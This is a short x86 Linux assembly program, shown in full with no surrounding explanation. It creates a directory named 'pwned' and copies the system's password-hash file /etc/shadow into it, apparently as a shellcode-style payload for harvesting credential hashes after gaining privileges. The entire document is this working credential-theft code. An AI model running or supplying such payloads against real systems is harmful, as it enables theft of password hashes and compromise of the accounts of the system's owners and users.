section .data
    dirname     db "pwned", 0
    src_path    db "/etc/shadow", 0
    dest_path   db "pwned/shadow", 0
    buffer      times 4096 db 0    ; 4KB buffer

section .text
    global _start

_start:
    ; mkdir("pwned", 0755)
    mov eax, 39         ; sys_mkdir (0x27)
    mov ebx, dirname
    mov ecx, 0o755
    int 0x80

    ; open("/etc/shadow", O_RDONLY)
    mov eax, 5          ; sys_open
    mov ebx, src_path
    xor ecx, ecx        ; O_RDONLY
    int 0x80
    mov esi, eax        ; store src fd in esi

    ; open("pwned/shadow", O_CREAT|O_WRONLY|O_TRUNC, 0644)
    mov eax, 5
    mov ebx, dest_path
    mov ecx, 0x241      ; O_WRONLY|O_CREAT|O_TRUNC
    mov edx, 0o644
    int 0x80
    mov edi, eax        ; store dest fd in edi

read_loop:
    ; read(src_fd, buffer, 4096)
    mov eax, 3          ; sys_read
    mov ebx, esi
    mov ecx, buffer
    mov edx, 4096
    int 0x80
    test eax, eax
    jz done             ; if read returns 0, EOF
    mov ebp, eax        ; bytes read

    ; write(dest_fd, buffer, bytes)
    mov eax, 4          ; sys_write
    mov ebx, edi
    mov ecx, buffer
    mov edx, ebp
    int 0x80
    jmp read_loop

done:
    ; close(src_fd)
    mov eax, 6
    mov ebx, esi
    int 0x80

    ; close(dest_fd)
    mov eax, 6
    mov ebx, edi
    int 0x80

    ; exit(0)
    mov eax, 1
    xor ebx, ebx
    int 0x80
